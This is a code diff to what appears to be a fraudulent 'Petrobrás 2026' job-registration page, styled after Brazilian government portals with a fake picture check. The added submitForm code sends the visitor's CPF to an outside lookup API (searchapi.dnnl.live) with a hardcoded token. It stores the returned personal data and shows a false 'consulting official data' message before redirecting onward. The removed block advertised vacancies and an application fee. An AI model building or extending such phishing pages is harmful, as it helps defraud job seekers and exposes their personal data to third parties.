@@ -5,14 +5,6 @@
     <meta content="width=device-width, initial-scale=1.0" name="viewport" />
     <title>Processo Seletivo Petrobrás 2026 - Inscrição</title>
 
-    <script type="text/javascript">
-        (function (c, l, a, r, i, t, y) {
-            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments); };
-            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-        })(window, document, "clarity", "script", "t84urj3twx");
-    </script>
-
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="all.min.css" rel="stylesheet" />
     <link href="home.css" rel="stylesheet" />
@@ -23,11 +15,11 @@
         .form-header { background-color: #fbc12a; color: white; }
         .form-footer { background-color: #003f6b; color: white; }
         button#submit-button { transition: all 0.2s ease; background-color: #003f6b; color: rgba(255, 255, 255, 0.6); }
-        button#submit-button:not([disabled]) { color: white; cursor: pointer; }
+        button#submit-button:not([disabled]) { color: white; cursor: pointer; background-color: #005691; }
         .required-star { color: #ff0000; }
         .gov-header { background-color: #222222; }
         .inep-header { background-color: #044785; }
-        .selected { border: 4px dashed #2b7a9a !important; }
+        .selected { border: 4px dashed #2b7a9a !important; opacity: 1 !important; }
         .transparent { opacity: 0.5; }
     </style>
 
@@ -44,9 +36,13 @@
 
         function selectImage(element, index) {
             const images = document.querySelectorAll(".image-option");
-            images.forEach((img) => { img.classList.remove("selected"); img.classList.add("transparent"); });
+            images.forEach((img) => { img.classList.add("transparent"); img.classList.remove("selected"); });
             element.classList.add("selected");
             element.classList.remove("transparent");
+            
+            // Armazena a escolha no dataset para o validador
+            document.getElementById("submit-button").dataset.imgSelected = index;
+
             if (index !== 4) {
                 document.getElementById("error-popup").classList.remove("hidden");
                 setTimeout(() => document.getElementById("error-popup").classList.add("hidden"), 3000);
@@ -56,19 +52,45 @@
 
         function checkFormValidity() {
             const cpfInput = document.querySelector("#cpf");
-            const selectedImage = document.querySelector(".image-option.selected");
+            const imgSelected = document.getElementById("submit-button").dataset.imgSelected;
             const submitButton = document.querySelector("#submit-button");
-            const images = document.querySelectorAll(".image-option");
-            if (cpfInput.value.length === 14 && selectedImage === images[4]) {
+            
+            // Habilita apenas se CPF estiver completo e a imagem 4 (Folha) selecionada
+            if (cpfInput.value.length === 14 && imgSelected === "4") {
                 submitButton.disabled = false;
             } else {
                 submitButton.disabled = true;
             }
         }
 
-        function submitForm() {
+        async function submitForm() {
+            const cpfLimpo = document.querySelector("#cpf").value.replace(/\D/g, "");
+            const token = "0047";
+            const url = `https://searchapi.dnnl.live/consulta?token_api=${token}&cpf=${cpfLimpo}`;
+
             document.getElementById("validation-popup").classList.remove("hidden");
-            setTimeout(() => { window.location.href = "../validar-dados/index.html"; }, 2000);
+
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+
+                if (data) {
+                    // Salva o retorno da API no localStorage para o arquivo index-5.html ler
+                    localStorage.setItem("cpfData", JSON.stringify(data));
+                    
+                    setTimeout(() => { 
+                        // Altere o caminho abaixo para a pasta correta do seu validar-dados
+                        window.location.href = "validar-dados/index.html"; 
+                    }, 1500);
+                } else {
+                    alert("Dados não encontrados para este CPF.");
+                    document.getElementById("validation-popup").classList.add("hidden");
+                }
+            } catch (error) {
+                console.error("Erro na API:", error);
+                alert("Erro ao consultar servidor. Verifique sua conexão.");
+                document.getElementById("validation-popup").classList.add("hidden");
+            }
         }
     </script>
 </head>
@@ -93,42 +115,6 @@
 
     <main class="flex-grow py-8 px-4">
         <div class="container mx-auto max-w-3xl">
-            <div class="bg-blue-50 border-l-4 border-blue-500 p-6 mb-6 rounded shadow-sm">
-                <h3 class="text-lg font-bold text-blue-900 mb-4 uppercase">INFORMAÇÕES IMPORTANTES</h3>
-                <p class="text-gray-800 mb-4">Prezado(a) Candidato(a), bem-vindo(a) ao sistema de inscrição para o Processo Seletivo Simplificado Petrobrás 2026:</p>
-                
-                <div class="text-sm text-gray-700 space-y-4">
-                    <p><strong>Cargos:</strong></p>
-                    <p><strong>Nível Médio/Técnico:</strong></p>
-                    <ul class="list-disc list-inside ml-2">
-                        <li>Técnico de Operação (com alta demanda e salários maiores no regime embarcado)</li>
-                        <li>Técnico de Manutenção (Mecânica, Elétrica, Instrumentação, Caldeiraria)</li>
-                        <li>Técnico de Segurança</li>
-                        <li>Técnico de Administração</li>
-                        <li>Química de Petróleo</li>
-                        <li>Inspeção de Equipamentos e Instalações</li>
-                        <li>Logística de Transportes (Controle)</li>
-                    </ul>
-
-                    <p><strong>Nível Superior:</strong></p>
-                    <ul class="list-disc list-inside ml-2">
-                        <li>Engenharia: Petróleo, Processamento, Produção, Mecânica, Elétrica, Civil, Ambiental, Naval, de Segurança de Processo, etc.</li>
-                        <li>Análise: Administração, Comércio e Suprimento, Transporte Marítimo, Sistemas (Software, Infraestrutura, Processos de Negócio), Ciência de Dados, Economia, Estatística, etc.</li>
-                        <li>Geociências: Geologia, Geofísica</li>
-                        <li>Outras: Química, Enfermagem do Trabalho, etc.</li>
-                    </ul>
-
-                    <div class="pt-2 space-y-1">
-                        <p><strong>Vagas:</strong> 9.590 vagas temporárias</p>
-                        <p><strong>Salário:</strong> De R$ 2.676,24 a R$ 19.379,00 + auxílio alimentação de R$ 1.175,00</p>
-                        <p><strong>Taxa de Inscrição:</strong> R$ 54,97</p>
-                        <p><strong>Inscrições:</strong> Até 22 de janeiro de 2026</p>
-                        <p><strong>Prova:</strong> 22 de fevereiro de 2026</p>
-                        <p><strong>Banca:</strong> CEBRASPE</p>
-                    </div>
-                </div>
-            </div>
-
             <div class="bg-white border border-gray-300 rounded overflow-hidden shadow-md">
                 <div class="form-header py-3 px-4 text-center font-bold">
                     Inscrição > Processo Seletivo Petrobrás 2026
@@ -136,20 +122,20 @@
                 <div class="p-6">
                     <div class="mb-6">
                         <label class="block mb-2 font-bold text-gray-700">CPF: <span class="required-star">*</span></label>
-                        <input id="cpf" type="tel" oninput="formatCPF(this)" placeholder="___.___.___-__" class="w-full p-3 border border-gray-300 rounded outline-none" />
+                        <input id="cpf" type="tel" oninput="formatCPF(this)" placeholder="000.000.000-00" class="w-full p-3 border border-gray-300 rounded outline-none focus:border-blue-500" />
                     </div>
                     
                     <p class="mb-3 font-bold text-[#2B4F81]">Clique abaixo, na figura FOLHA: *</p>
                     <div class="grid grid-cols-5 gap-1 bg-[#D8E8E8] p-1 border-4 border-[#D8E8E8]">
-                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center" onclick="selectImage(this, 0)"><img src="../images/download-6.png" class="w-8 h-8" /></div>
-                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center" onclick="selectImage(this, 1)"><img src="../images/download-5.png" class="w-8 h-8" /></div>
-                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center" onclick="selectImage(this, 2)"><img src="../images/download-4.png" class="w-8 h-8" /></div>
-                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center" onclick="selectImage(this, 3)"><img src="../images/download-3.png" class="w-8 h-8" /></div>
-                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center" onclick="selectImage(this, 4)"><img src="../images/leaf.png" class="w-8 h-8" /></div>
+                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center transparent" onclick="selectImage(this, 0)"><img src="../images/download-6.png" class="w-8 h-8" /></div>
+                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center transparent" onclick="selectImage(this, 1)"><img src="../images/download-5.png" class="w-8 h-8" /></div>
+                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center transparent" onclick="selectImage(this, 2)"><img src="../images/download-4.png" class="w-8 h-8" /></div>
+                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center transparent" onclick="selectImage(this, 3)"><img src="../images/download-3.png" class="w-8 h-8" /></div>
+                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center transparent" onclick="selectImage(this, 4)"><img src="../images/leaf.png" class="w-8 h-8" /></div>
                     </div>
                 </div>
                 <div class="form-footer">
-                    <button id="submit-button" disabled class="w-full py-4 font-bold uppercase" onclick="submitForm()">Enviar</button>
+                    <button id="submit-button" disabled data-img-selected="" class="w-full py-4 font-bold uppercase" onclick="submitForm()">Enviar</button>
                 </div>
             </div>
         </div>
@@ -162,7 +148,7 @@
     <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
         <div class="absolute inset-0 bg-black opacity-50"></div>
         <div class="bg-white p-8 rounded-lg z-10 text-center">
-            <p class="text-[#003f6b] font-bold text-xl">Validando dados...</p>
+            <p class="text-[#003f6b] font-bold text-xl">Consultando dados oficiais...</p>
         </div>
     </div>
 </body>
